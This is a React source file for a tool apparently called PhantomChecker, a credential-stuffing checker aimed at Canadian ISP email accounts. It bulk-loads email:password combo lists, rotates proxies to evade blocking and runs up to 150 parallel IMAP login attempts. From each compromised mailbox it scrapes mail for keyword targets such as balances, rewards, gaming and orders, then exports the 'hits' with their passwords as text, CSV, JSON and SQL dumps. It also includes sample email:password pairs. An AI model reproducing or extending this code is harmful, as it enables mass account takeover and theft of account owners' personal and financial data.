import { useState, useEffect, useRef, useMemo, useCallback } from 'react';
import { isCanadianEmail, getImapConfigForEmail } from './data/canadianDomains.js';
import { INITIAL_KEYWORD_TARGETS } from './data/mockMails.js';
import { Sidebar } from './components/Sidebar.jsx';
import { SplashScreen } from './components/SplashScreen.jsx';
import { CheckerStudioTab } from './components/Tabs/CheckerStudioTab.jsx';
import { ProxyTab } from './components/Tabs/ProxyTab.jsx';
import { MailViewerTab } from './components/Tabs/MailViewerTab.jsx';
import { KeywordTargetTab } from './components/Tabs/KeywordTargetTab.jsx';
import { CanadianDomainsTab } from './components/Tabs/CanadianDomainsTab.jsx';
import { testKeywordMatch } from './utils/keywordMatcher.js';

export default function App() {
  const [showSplash, setShowSplash] = useState(() => {
    try { return new URLSearchParams(window.location.search).get('nosplash') !== '1'; } catch { return true; }
  });
  const [activeTab, setActiveTab] = useState(() => {
    try { return new URLSearchParams(window.location.search).get('tab') || 'checker'; } catch { return 'checker'; }
  });
  const [combos, setCombos] = useState([]);
  const [proxies, setProxies] = useState([]);
  const [proxyMode, setProxyMode] = useState('none');
  const [filterOnlyCanadian, setFilterOnlyCanadian] = useState(false);
  const [threads, setThreads] = useState(25);
  const [timeoutSec, setTimeoutSec] = useState(8);
  const [useLiveSocket, setUseLiveSocket] = useState(true);
  const [isRunning, setIsRunning] = useState(false);
  const [mails, setMails] = useState([]);
  const [validAccounts, setValidAccounts] = useState([]);
  const [selectedAccount, setSelectedAccount] = useState('');
  const [keywords, setKeywords] = useState(() => {
    try {
      const saved = localStorage.getItem('phantom_target_keywords');
      if (saved) {
        const parsed = JSON.parse(saved);
        if (Array.isArray(parsed) && parsed.length > 0) return parsed;
      }
    } catch {}
    return INITIAL_KEYWORD_TARGETS;
  });

  useEffect(() => {
    try {
      localStorage.setItem('phantom_target_keywords', JSON.stringify(keywords));
    } catch {}
  }, [keywords]);

  // High-performance streaming state for large files
  const [parsingStatus, setParsingStatus] = useState(null);

  const completedTimestampsRef = useRef([]);
  const [liveCpm, setLiveCpm] = useState(0);
  const [liveCps, setLiveCps] = useState('0.0');

  const isRunningRef = useRef(isRunning);
  const flushTimerRef = useRef(null);
  const comboListRef = useRef([]);
  const folderFetchQueueRef = useRef([]);
  const activeFolderFetchesRef = useRef(0);

  useEffect(() => {
    isRunningRef.current = isRunning;
  }, [isRunning]);

  const [exportToast, setExportToast] = useState(null);

  useEffect(() => {
    if (proxies.length > 0 && proxyMode === 'none') {
      setProxyMode('rotating');
    }
  }, [proxies.length, proxyMode]);

  useEffect(() => {
    const timer = setInterval(() => {
      const now = Date.now();
      completedTimestampsRef.current = completedTimestampsRef.current.filter(t => now - t <= 60000);
      const count = completedTimestampsRef.current.length;
      setLiveCpm(count);

      const last5s = completedTimestampsRef.current.filter(t => now - t <= 5000).length;
      setLiveCps((last5s / 5).toFixed(1));
    }, 500);

    return () => clearInterval(timer);
  }, []);

  const keywordsWithHits = useMemo(() => {
    if (keywords.length === 0) return [];
    if (mails.length === 0) {
      return keywords.map(k => ({ ...k, hitsCount: 0 }));
    }
    const mailCorpuses = mails.map(m =>
      `${m.subject || ''} ${m.sender || ''} ${m.senderEmail || ''} ${m.bodyText || ''}`.toLowerCase()
    );
    return keywords.map(k => {
      const q = (k.keyword || '').toLowerCase().trim();
      if (!q) return { ...k, hitsCount: 0 };
      
      let count = 0;
      for (let i = 0; i < mails.length; i++) {
        const m = mails[i];
        if (testKeywordMatch(mailCorpuses[i], q, { fromAddr: m.senderEmail, fromName: m.sender, subject: m.subject })) {
          count++;
        }
      }
      return { ...k, hitsCount: count };
    });
  }, [keywords, mails]);

  const stats = useMemo(() => {
    const total = combos.length;
    let checked = 0;
    let validHits = 0;
    let canadianHits = 0;
    let invalid = 0;
    let secLock = 0;

    const comboEmailSet = new Set();
    for (let i = 0; i < total; i++) {
      const c = combos[i];
      const s = c.status;
      if (s !== 'idle' && s !== 'checking') checked++;
      if (s === 'valid') {
        validHits++;
        if (c.isCanadian) canadianHits++;
      } else if (s === 'invalid') {
        invalid++;
      } else if (s === '2fa') {
        secLock++;
      }
      if (c.email) comboEmailSet.add(c.email.toLowerCase());
    }

    let extraValid = 0;
    let extraCanadian = 0;
    for (let i = 0; i < validAccounts.length; i++) {
      const a = validAccounts[i];
      const lower = a.toLowerCase();
      if (!comboEmailSet.has(lower)) {
        extraValid++;
        if (isCanadianEmail(a)) extraCanadian++;
      }
    }

    const totalTargetHits = keywordsWithHits.reduce((acc, k) => acc + (k.hitsCount || 0), 0);

    return {
      totalLoaded: total,
      checked,
      validHits: validHits + extraValid,
      canadianHits: canadianHits + extraCanadian,
      invalid,
      securityLock: secLock,
      error: 0,
      targetHitsCount: totalTargetHits,
      progressPercent: total > 0 ? Math.round((checked / total) * 100) : 0,
      cpm: liveCpm,
      cps: isRunning ? liveCps : '0.0',
      proxyCount: proxies.length,
      proxyMode
    };
  }, [combos, validAccounts, keywordsWithHits, isRunning, liveCpm, liveCps, proxies.length, proxyMode]);

  const idCounterRef = useRef(0);

  const parseSingleLine = useCallback((trimmed) => {
    if (!trimmed || trimmed.startsWith('#')) return null;
    let separator = ':';
    if (!trimmed.includes(':')) {
      if (trimmed.includes(';')) separator = ';';
      else if (trimmed.includes('|')) separator = '|';
      else if (trimmed.includes('\t')) separator = '\t';
      else if (trimmed.includes(',')) separator = ',';
    }
    const parts = trimmed.split(separator);
    let email = '', password = '';
    if (parts.length >= 2) {
      if (parts[0].includes('@')) {
        email = parts[0].trim();
        password = parts.slice(1).join(separator).trim();
      } else if (parts.length >= 4 && parts[2].includes('@')) {
        email = parts[2].trim();
        password = parts[3].trim();
      } else {
        email = `${parts[0].trim()}@sympatico.ca`;
        password = parts[1].trim();
      }
    }
    if (!email) return null;
    const domain = email.split('@')[1] || '';
    const isCa = isCanadianEmail(email);
    const imap = getImapConfigForEmail(email);
    const seq = idCounterRef.current++;
    // Minimal footprint object for 500k-1M+ combo lists
    return {
      id: `c-${seq}`,
      email, password, domain, isCanadian: isCa,
      status: 'idle', imapHost: imap.host, imapPort: imap.port
    };
  }, []);

  const streamParseFile = useCallback(async (file) => {
    const CHUNK_BYTES = 2 * 1024 * 1024; // 2MB streaming chunks
    let leftover = '';
    let offset = 0;
    const size = file.size;
    let totalLoadedSoFar = 0;

    setParsingStatus({ fileName: file.name, loadedCount: 0, percent: 0 });

    let accumulatedBatch = [];
    const seenInSession = new Set();

    while (offset < size) {
      const slice = file.slice(offset, Math.min(offset + CHUNK_BYTES, size));
      const chunkText = await slice.text();
      offset += CHUNK_BYTES;

      const combined = leftover + chunkText;
      const lines = combined.split(/\r?\n/);

      if (offset < size) {
        leftover = lines.pop() || '';
      } else {
        leftover = '';
      }

      for (let i = 0; i < lines.length; i++) {
        const item = parseSingleLine(lines[i].trim());
        if (item) {
          const key = `${item.email.toLowerCase()}:${item.password}`;
          if (!seenInSession.has(key)) {
            seenInSession.add(key);
            accumulatedBatch.push(item);
            totalLoadedSoFar++;
          }
        }
      }

      // Non-blocking flush every 25,000 items
      if (accumulatedBatch.length >= 25000) {
        const toAppend = accumulatedBatch;
        accumulatedBatch = [];
        setCombos(prev => [...prev, ...toAppend]);
        setParsingStatus({
          fileName: file.name,
          loadedCount: totalLoadedSoFar,
          percent: Math.min(99, Math.round((offset / size) * 100))
        });
        // Yield thread so user can navigate tabs smoothly
        await new Promise(r => setTimeout(r, 0));
      }
    }

    if (leftover) {
      const item = parseSingleLine(leftover.trim());
      if (item) {
        const key = `${item.email.toLowerCase()}:${item.password}`;
        if (!seenInSession.has(key)) {
          seenInSession.add(key);
          accumulatedBatch.push(item);
          totalLoadedSoFar++;
        }
      }
    }

    if (accumulatedBatch.length > 0) {
      const toAppend = accumulatedBatch;
      setCombos(prev => [...prev, ...toAppend]);
    }

    setParsingStatus({
      fileName: file.name,
      loadedCount: totalLoadedSoFar,
      percent: 100
    });
    setTimeout(() => setParsingStatus(null), 2500);
  }, [parseSingleLine]);

  const parseRawCombos = useCallback((text) => {
    const lines = text.split(/\r?\n/);
    const items = [];
    const seen = new Set();
    for (const line of lines) {
      const item = parseSingleLine(line.trim());
      if (item) {
        const key = `${item.email.toLowerCase()}:${item.password}`;
        if (!seen.has(key)) {
          seen.add(key);
          items.push(item);
        }
      }
    }
    if (items.length > 0) {
      setCombos(prev => {
        const prevSeen = new Set(prev.map(p => `${p.email.toLowerCase()}:${p.password}`));
        const uniqueNew = items.filter(it => !prevSeen.has(`${it.email.toLowerCase()}:${it.password}`));
        return [...prev, ...uniqueNew];
      });
    }
  }, [parseSingleLine]);

  // Instant non-blocking deduplication
  const handleRemoveDuplicates = useCallback(() => {
    setCombos(prev => {
      const seen = new Set();
      const unique = [];
      let dupesCount = 0;
      for (const c of prev) {
        const key = `${c.email.toLowerCase()}:${c.password}`;
        if (!seen.has(key)) {
          seen.add(key);
          unique.push(c);
        } else {
          dupesCount++;
        }
      }
      setExportToast({
        type: 'success',
        msg: dupesCount > 0
          ? `✓ Deduplicated: Removed ${dupesCount} duplicate combo(s). (${unique.length} unique retained)`
          : `✓ Clean list: 0 duplicates found in ${unique.length} combo(s).`
      });
      setTimeout(() => setExportToast(null), 4000);
      return unique;
    });
  }, []);

  const handleFileUpload = useCallback(async (fileList) => {
    for (let i = 0; i < fileList.length; i++) {
      await streamParseFile(fileList[i]);
    }
  }, [streamParseFile]);

  const handleFolderUpload = useCallback(async (fileList) => {
    for (let i = 0; i < fileList.length; i++) {
      const name = fileList[i].name.toLowerCase();
      if (name.endsWith('.txt') || name.endsWith('.csv') || name.endsWith('.combo')) {
        await streamParseFile(fileList[i]);
      }
    }
  }, [streamParseFile]);

  const handleLoadSampleCombos = () => {
    const samples = [
      'doeflo@bell.net:Jagger$66',
      's.mona@bell.net:Madison20#',
      'Jod101@sympatico.ca:matt1835$',
      'swerner@sympatico.ca:SBAholom12$',
      'lplandry@cgocable.ca:loui5140',
      'lindadowsett@cogeco.ca:Madison1!',
      'gina.carofiglio@videotron.ca:Oklbnt1968',
      'ylacoste@videotron.ca:Attention101',
      'd.campbell@shaw.ca:Vancouver2025$',
      'g.roy@telus.net:TelusPass99',
      'marc.tremblay@sympatico.ca:P@ssword2026',
      'sarah.leclerc@hotmail.ca:Hotmail2026!',
      'dan.morrison@hotmail.com:DanMo99$',
      'mike.nguyen@live.ca:LiveCA2026!',
      'j.patel@outlook.com:OutlookPass!'
    ];
    parseRawCombos(samples.join('\n'));
  };

  const handleLoadSampleProxies = () => {
    const samples = [
      'socks5://184.178.172.5:4145',
      'socks5://72.210.252.134:4145',
      'socks4://192.252.208.70:14282',
      'http://50.222.228.42:80',
      'http://198.199.86.11:8080'
    ];
    const parsed = samples.map((line, idx) => {
      const proto = line.split('://')[0];
      const rest = line.split('://')[1];
      const [host, port] = rest.split(':');
      return {
        id: `px-sample-${idx}`,
        raw: line,
        protocol: proto,
        host,
        port: Number(port),
        user: '',
        pass: '',
        status: 'untested',
        latencyMs: null
      };
    });
    setProxies(prev => [...prev, ...parsed]);
  };

  const fetchRealFoldersForHit = useCallback(async (item, proxy = null) => {
    try {
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), 25000);
      const res = await fetch('/api/fetch-all-folders', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        signal: controller.signal,
        body: JSON.stringify({
          host: item.imapHost,
          port: item.imapPort,
          email: item.email,
          password: item.password,
          maxPerFolder: 15,
          timeout: 20000,
          keywords: keywords.map(k => k.keyword),
          proxy
        })
      });
      clearTimeout(timer);
      const data = await res.json();
      if (data.success && data.mails && data.mails.length > 0) {
        setMails(prev => {
          const filtered = prev.filter(m => m.email.toLowerCase() !== item.email.toLowerCase());
          const dedupedMap = new Map();
          data.mails.forEach(m => {
            if (m && m.id) dedupedMap.set(m.id, m);
          });
          filtered.forEach(m => {
            if (m && m.id && !dedupedMap.has(m.id)) dedupedMap.set(m.id, m);
          });
          return Array.from(dedupedMap.values());
        });

        const allHits = new Set();
        data.mails.forEach(m => {
          if (m.matchedTargets) m.matchedTargets.forEach(t => allHits.add(t));
        });

        return Array.from(allHits);
      }
      return [];
    } catch (err) {
      console.warn('Background folder scan skipped or timed out:', err?.message);
      return [];
    }
  }, [keywords]);

  const processFolderFetchQueue = useCallback(() => {
    if (activeFolderFetchesRef.current >= 2 || folderFetchQueueRef.current.length === 0) return;
    const task = folderFetchQueueRef.current.shift();
    if (!task) return;
    activeFolderFetchesRef.current++;

    fetchRealFoldersForHit(task.item, task.proxy)
      .then(matched => {
        if (task.onMatchFound && matched && matched.length > 0) {
          task.onMatchFound(matched);
        }
      })
      .catch(err => {
        console.warn('Background folder scan skipped:', err?.message);
      })
      .finally(() => {
        activeFolderFetchesRef.current--;
        processFolderFetchQueue();
      });
  }, [fetchRealFoldersForHit]);

  const enqueueFolderFetch = useCallback((item, proxy, onMatchFound) => {
    folderFetchQueueRef.current.push({ item, proxy, onMatchFound });
    processFolderFetchQueue();
  }, [processFolderFetchQueue]);

  const proxyIndexRef = useRef(0);

  const getNextProxy = () => {
    if (proxyMode === 'none' || proxies.length === 0) return null;
    const workingProxies = proxies.filter(p => p.status === 'working');
    const pool = workingProxies.length > 0 ? workingProxies : proxies;

    if (proxyMode === 'random') {
      const idx = Math.floor(Math.random() * pool.length);
      return pool[idx];
    }
    const idx = proxyIndexRef.current % pool.length;
    proxyIndexRef.current++;
    return pool[idx];
  };

  // ── True Parallel Multi-Threaded Engine ──
  const startCheckerEngine = () => {
    if (combos.length === 0) return;

    // Reset combos if all were previously checked so user can re-run freely
    const hasIdle = combos.some(c => c.status === 'idle');
    const initialList = hasIdle ? combos.map(c => c.status === 'checking' ? { ...c, status: 'idle' } : c) : combos.map(c => ({ ...c, status: 'idle' }));
    
    setCombos(initialList);

    setIsRunning(true);
    isRunningRef.current = true;

    // High-speed mutable in-memory tracker
    const comboList = initialList.map(c => ({ ...c }));
    comboListRef.current = comboList;
    let nextIdx = 0;
    let activeWorkers = 0;

    let lastFlushTime = 0;
    const flushToReact = (force = false) => {
      const now = Date.now();
      if (force || now - lastFlushTime >= 350) {
        if (flushTimerRef.current) {
          clearTimeout(flushTimerRef.current);
          flushTimerRef.current = null;
        }
        lastFlushTime = now;
        setCombos([...comboList]);
      } else if (!flushTimerRef.current) {
        flushTimerRef.current = setTimeout(() => {
          flushTimerRef.current = null;
          lastFlushTime = Date.now();
          setCombos([...comboList]);
        }, 350);
      }
    };

    const maxWorkers = Math.min(threads, 150);

    const dispatchNext = () => {
      if (!isRunningRef.current) return;

      while (nextIdx < comboList.length && comboList[nextIdx].status !== 'idle') {
        nextIdx++;
      }

      if (nextIdx >= comboList.length) {
        if (activeWorkers === 0) {
          setIsRunning(false);
          isRunningRef.current = false;
          flushToReact(true);
        }
        return;
      }

      const itemIndex = nextIdx;
      nextIdx++;
      const itemToCheck = comboList[itemIndex];
      comboList[itemIndex].status = 'checking';
      flushToReact(false);

      activeWorkers++;
      const proxy = getNextProxy();

      // Client-side fail-safe timeout: guarantees fetch can NEVER freeze the queue
      const controller = new AbortController();
      const clientTimeoutMs = (Math.max(timeoutSec, 8) + 3) * 1000;
      let timerCleared = false;
      const clientTimer = setTimeout(() => {
        timerCleared = true;
        try { controller.abort(); } catch {}
      }, clientTimeoutMs);

      fetch('/api/check-imap', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        signal: controller.signal,
        body: JSON.stringify({
          host: itemToCheck.imapHost,
          port: itemToCheck.imapPort,
          email: itemToCheck.email,
          password: itemToCheck.password,
          timeout: timeoutSec * 1000,
          proxy
        })
      })
        .then(res => res.json())
        .then(result => {
          if (!timerCleared) clearTimeout(clientTimer);
          completedTimestampsRef.current.push(Date.now());
          const newStatus = result.status || (result.success ? 'valid' : 'invalid');

          if (result.success || newStatus === 'valid') {
            const emailAddr = itemToCheck.email;
            setValidAccounts(accs => accs.includes(emailAddr) ? accs : [...accs, emailAddr]);
            setSelectedAccount(curr => curr || emailAddr);

            comboList[itemIndex].status = 'valid';
            flushToReact(false);

            // Fetch real folders in background queue so checking worker thread is NEVER blocked
            enqueueFolderFetch(itemToCheck, proxy, (matched) => {
              if (comboList[itemIndex]) {
                comboList[itemIndex].matchedKeywords = matched;
                flushToReact(false);
              }
            });
          } else {
            comboList[itemIndex].status = newStatus;
            flushToReact(false);
          }
        })
        .catch(() => {
          if (!timerCleared) clearTimeout(clientTimer);
          completedTimestampsRef.current.push(Date.now());
          comboList[itemIndex].status = 'invalid';
          flushToReact(false);
        })
        .finally(() => {
          if (!timerCleared) clearTimeout(clientTimer);
          activeWorkers--;
          if (activeWorkers === 0 && nextIdx >= comboList.length) {
            setIsRunning(false);
            isRunningRef.current = false;
            flushToReact(true);
          } else {
            dispatchNext();
          }
        });
    };

    // Spin up `maxWorkers` workers simultaneously!
    for (let w = 0; w < maxWorkers; w++) {
      dispatchNext();
    }
  };

  const stopCheckerEngine = () => {
    setIsRunning(false);
    isRunningRef.current = false;
    folderFetchQueueRef.current = [];
    if (flushTimerRef.current) {
      clearTimeout(flushTimerRef.current);
      flushTimerRef.current = null;
    }
    if (comboListRef.current && comboListRef.current.length > 0) {
      setCombos([...comboListRef.current]);
    }
  };

  const clearAll = () => {
    setIsRunning(false);
    isRunningRef.current = false;
    folderFetchQueueRef.current = [];
    if (flushTimerRef.current) {
      clearTimeout(flushTimerRef.current);
      flushTimerRef.current = null;
    }
    comboListRef.current = [];
    setCombos([]);
  };

  const handleExportHits = (format = 'txt') => {
    const valid = combos.filter(c => c.status === 'valid');
    if (valid.length === 0 && validAccounts.length > 0) {
      const content = validAccounts.join('\n');
      downloadFile(content, 'valid_canadian_imap_hits.txt', 'text/plain');
      return;
    }

    // Enrich hits with extracted assets
    const enrichedHits = valid.map(c => {
      const accountMails = mails.filter(m => m.email && m.email.toLowerCase() === c.email.toLowerCase());
      const balances = [...new Set(accountMails.flatMap(m => m.extractedData?.balances || []))];
      const gaming = [...new Set(accountMails.flatMap(m => m.extractedData?.gaming || []))];
      const rewards = [...new Set(accountMails.flatMap(m => m.extractedData?.rewards || []))];
      const memberships = [...new Set(accountMails.flatMap(m => m.extractedData?.memberships || []))];
      const orders = [...new Set(accountMails.flatMap(m => m.extractedData?.orders || []))];
      const tracking = [...new Set(accountMails.flatMap(m => (m.extractedData?.tracking || []).map(t => `${t.carrier}:${t.trackingNumber}`)))];

      return {
        ...c,
        extracted: {
          balances,
          gaming,
          rewards,
          memberships,
          orders,
          tracking
        }
      };
    });

    if (format === 'json') {
      const content = JSON.stringify(enrichedHits, null, 2);
      downloadFile(content, 'imap_valid_hits_enriched.json', 'application/json');
    } else if (format === 'jsonl') {
      const content = enrichedHits.map(item => JSON.stringify(item)).join('\n');
      downloadFile(content, 'imap_valid_hits.jsonl', 'application/x-ndjson');
    } else if (format === 'csv_full') {
      const headers = 'Email,Password,Domain,IMAP Host,IMAP Port,Status,Matched Keywords,Balances,Gaming,Rewards,Memberships,Orders,Tracking\n';
      const rows = enrichedHits.map(c => {
        const esc = (val) => `"${String(val || '').replace(/"/g, '""')}"`;
        return [
          esc(c.email),
          esc(c.password),
          esc(c.domain),
          esc(c.imapHost),
          c.imapPort || 993,
          esc(c.status),
          esc((c.matchedKeywords || []).join('; ')),
          esc(c.extracted.balances.join('; ')),
          esc(c.extracted.gaming.join('; ')),
          esc(c.extracted.rewards.join('; ')),
          esc(c.extracted.memberships.join('; ')),
          esc(c.extracted.orders.join('; ')),
          esc(c.extracted.tracking.join('; '))
        ].join(',');
      }).join('\n');
      downloadFile(headers + rows, 'imap_valid_hits_full_assets.csv', 'text/csv');
    } else if (format === 'csv') {
      const headers = 'Email,Password,Domain,IMAP Host,IMAP Port,Status,Matched Keywords\n';
      const rows = valid.map(c => `"${c.email}","${c.password}","${c.domain}","${c.imapHost}",${c.imapPort},"${c.status}","${(c.matchedKeywords||[]).join(';')}"`).join('\n');
      downloadFile(headers + rows, 'imap_valid_hits.csv', 'text/csv');
    } else if (format === 'sql') {
      let sql = `-- PhantomChecker Database Hit Dump (SQLite 3.24+ & PostgreSQL Compatible)\n`;
      sql += `CREATE TABLE IF NOT EXISTS imap_hits (\n`;
      sql += `  email VARCHAR(255) PRIMARY KEY,\n`;
      sql += `  password TEXT,\n`;
      sql += `  domain VARCHAR(255),\n`;
      sql += `  imap_host VARCHAR(255),\n`;
      sql += `  imap_port INTEGER,\n`;
      sql += `  status VARCHAR(50),\n`;
      sql += `  matched_keywords TEXT,\n`;
      sql += `  balances TEXT,\n`;
      sql += `  gaming TEXT,\n`;
      sql += `  rewards TEXT,\n`;
      sql += `  memberships TEXT,\n`;
      sql += `  orders TEXT,\n`;
      sql += `  tracking TEXT\n`;
      sql += `);\n\n`;

      const inserts = enrichedHits.map(c => {
        const sq = (s) => `'${String(s || '').replace(/'/g, "''")}'`;
        const colList = 'email, password, domain, imap_host, imap_port, status, matched_keywords, balances, gaming, rewards, memberships, orders, tracking';
        const valList = [
          sq(c.email),
          sq(c.password),
          sq(c.domain),
          sq(c.imapHost),
          Number(c.imapPort) || 993,
          sq(c.status),
          sq((c.matchedKeywords || []).join(';')),
          sq(c.extracted.balances.join(';')),
          sq(c.extracted.gaming.join(';')),
          sq(c.extracted.rewards.join(';')),
          sq(c.extracted.memberships.join(';')),
          sq(c.extracted.orders.join(';')),
          sq(c.extracted.tracking.join(';'))
        ].join(', ');

        return `INSERT INTO imap_hits (${colList}) VALUES (${valList}) ON CONFLICT (email) DO UPDATE SET password=EXCLUDED.password, status=EXCLUDED.status, matched_keywords=EXCLUDED.matched_keywords, balances=EXCLUDED.balances, gaming=EXCLUDED.gaming, rewards=EXCLUDED.rewards, memberships=EXCLUDED.memberships, orders=EXCLUDED.orders, tracking=EXCLUDED.tracking;`;
      }).join('\n');

      downloadFile(sql + inserts, 'imap_hits_dump.sql', 'application/sql');
    } else if (format === 'txt_full') {
      const content = valid.map(c => `${c.email}:${c.password}:${c.imapHost}:${c.imapPort}`).join('\n');
      downloadFile(content, 'imap_valid_hits_full.txt', 'text/plain');
    } else {
      const content = valid.map(c => `${c.email}:${c.password}`).join('\n');
      downloadFile(content, 'imap_valid_hits.txt', 'text/plain');
    }
  };

  const downloadFile = (content, filename, type) => {
    const blob = new Blob([content], { type });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    a.click();
    URL.revokeObjectURL(url);
  };

  const handleInspectMail = (email) => {
    setSelectedAccount(email);
    setActiveTab('mail-viewer');
  };

  const handleDeleteMail = (mailId) => {
    setMails(prev => prev.filter(m => m.id !== mailId));
  };

  const handleAddTargetKeyword = (kw, cat = 'Custom') => {
    if (!kw || !kw.trim()) return;
    const clean = kw.toLowerCase().trim();
    setKeywords(prev => {
      if (prev.some(k => k.keyword.toLowerCase() === clean)) return prev;
      return [
        ...prev,
        {
          id: `kw-${Date.now()}-${Math.random().toString(36).substring(2, 6)}`,
          keyword: clean,
          category: cat,
          color: '#00e5ff',
          hitsCount: 0
        }
      ];
    });
  };

  const handleAddBatchKeywords = (keywordList, cat = 'Custom') => {
    if (!Array.isArray(keywordList) || keywordList.length === 0) return;
    setKeywords(prev => {
      const existing = new Set(prev.map(k => k.keyword.toLowerCase()));
      const newItems = [];
      keywordList.forEach((item, idx) => {
        const kw = typeof item === 'object' && item.kw ? item.kw : item;
        const category = typeof item === 'object' && item.cat ? item.cat : cat;
        const clean = kw ? String(kw).toLowerCase().trim() : '';
        if (clean && !existing.has(clean)) {
          existing.add(clean);
          newItems.push({
            id: `kw-${Date.now()}-${Math.random().toString(36).substring(2, 6)}-${idx}`,
            keyword: clean,
            category,
            color: '#00e5ff',
            hitsCount: 0
          });
        }
      });
      return newItems.length > 0 ? [...prev, ...newItems] : prev;
    });
  };

  const handleRemoveTargetKeyword = (id) => {
    setKeywords(prev => prev.filter(k => k.id !== id));
  };

  const handleClearKeywords = () => {
    setKeywords([]);
  };

  return (
    <div style={{
      display: 'flex',
      flexDirection: 'row',
      width: '100vw',
      height: '100vh',
      background: '#05070d',
      overflow: 'hidden',
      position: 'relative'
    }}>
      {/* ── Animated Splash Screen on Launch or on Demand ── */}
      {showSplash && (
        <SplashScreen onDismiss={() => setShowSplash(false)} />
      )}

      {/* ── Auto-Export Toast Notification ─────────────────────────────── */}
      {exportToast && (
        <div style={{
          position: 'fixed', bottom: '24px', right: '24px', zIndex: 9999,
          background: exportToast.type === 'success'
            ? 'linear-gradient(135deg, rgba(0,255,157,0.15), rgba(0,229,255,0.08))'
            : 'linear-gradient(135deg, rgba(248,113,113,0.15), rgba(239,68,68,0.08))',
          border: `1px solid ${exportToast.type === 'success' ? 'rgba(0,255,157,0.4)' : 'rgba(248,113,113,0.4)'}`,
          borderRadius: '14px', padding: '14px 20px',
          backdropFilter: 'blur(20px)',
          boxShadow: '0 8px 32px rgba(0,0,0,0.4)',
          display: 'flex', alignItems: 'flex-start', gap: '12px',
          maxWidth: '420px', animation: 'slideInRight 0.3s ease'
        }}>
          <div style={{
            width: '8px', height: '8px', borderRadius: '50%', marginTop: '5px', flexShrink: 0,
            background: exportToast.type === 'success' ? '#00ff9d' : '#f87171',
            boxShadow: `0 0 8px ${exportToast.type === 'success' ? '#00ff9d' : '#f87171'}`
          }} />
          <div>
            <div style={{ fontSize: '0.78rem', fontWeight: 700, color: '#fff', marginBottom: '3px' }}>
              {exportToast.type === 'success' ? '✓ Hits Exported' : '✗ Export Failed'}
            </div>
            <div style={{ fontSize: '0.68rem', color: '#8b9bb4', fontFamily: "'JetBrains Mono', monospace", wordBreak: 'break-all', lineHeight: 1.5 }}>
              {exportToast.msg}
            </div>
          </div>
          <button onClick={() => setExportToast(null)}
            style={{ background: 'none', border: 'none', color: '#8b9bb4', cursor: 'pointer', fontSize: '1rem', lineHeight: 1, marginLeft: 'auto', flexShrink: 0 }}>
            ×
          </button>
        </div>
      )}

      {/* ── Left Sidebar Navigation (Top to Bottom) & Telemetry Controls ── */}
      <Sidebar
        activeTab={activeTab}
        setActiveTab={setActiveTab}
        stats={stats}
        isRunning={isRunning}
        useLiveSocket={useLiveSocket}
        onStart={startCheckerEngine}
        onStop={stopCheckerEngine}
        onClear={clearAll}
        onShowSplash={() => setShowSplash(true)}
      />

      {/* ── Main Workspace Area (Right) ─────────────────────────────────── */}
      <main style={{
        flex: 1,
        minWidth: 0,
        height: '100vh',
        display: 'flex',
        flexDirection: 'column',
        overflowY: activeTab === 'mail-viewer' ? 'hidden' : 'auto',
        overflowX: 'hidden',
        padding: activeTab === 'mail-viewer' ? '8px 12px' : '16px 20px'
      }}>
        {activeTab === 'checker' && (
          <CheckerStudioTab
            combos={combos}
            stats={stats}
            onFileUpload={handleFileUpload}
            onFolderUpload={handleFolderUpload}
            onLoadSampleCombos={handleLoadSampleCombos}
            onExportHits={handleExportHits}
            filterOnlyCanadian={filterOnlyCanadian}
            setFilterOnlyCanadian={setFilterOnlyCanadian}
            threads={threads}
            setThreads={setThreads}
            timeoutSec={timeoutSec}
            setTimeoutSec={setTimeoutSec}
            onInspectMail={handleInspectMail}
            useLiveSocket={useLiveSocket}
            setUseLiveSocket={setUseLiveSocket}
            proxyMode={proxyMode}
            proxyCount={proxies.length}
            setActiveTab={setActiveTab}
            parsingStatus={parsingStatus}
            onRemoveDuplicates={handleRemoveDuplicates}
          />
        )}

        {activeTab === 'proxies' && (
          <ProxyTab
            proxies={proxies}
            setProxies={setProxies}
            proxyMode={proxyMode}
            setProxyMode={setProxyMode}
            onLoadSampleProxies={handleLoadSampleProxies}
            onClearProxies={() => setProxies([])}
          />
        )}

        <div style={{ display: activeTab === 'mail-viewer' ? 'block' : 'none', height: '100%' }}>
          <MailViewerTab
            mailboxes={validAccounts}
            setValidAccounts={setValidAccounts}
            selectedAccount={selectedAccount}
            setSelectedAccount={setSelectedAccount}
            mails={mails}
            setMails={setMails}
            onDeleteMail={handleDeleteMail}
            onAddTargetKeyword={handleAddTargetKeyword}
            combos={combos}
            keywords={keywords}
            onLoadSampleCombos={handleLoadSampleCombos}
            setActiveTab={setActiveTab}
          />
        </div>

        {(activeTab === 'keyword-targets' || activeTab === 'keywords') && (
          <KeywordTargetTab
            keywords={keywordsWithHits}
            onAddKeyword={handleAddTargetKeyword}
            onAddBatchKeywords={handleAddBatchKeywords}
            onRemoveKeyword={handleRemoveTargetKeyword}
            onClearKeywords={handleClearKeywords}
          />
        )}

        {activeTab === 'canadian-domains' && (
          <CanadianDomainsTab />
        )}
      </main>
    </div>
  );
}
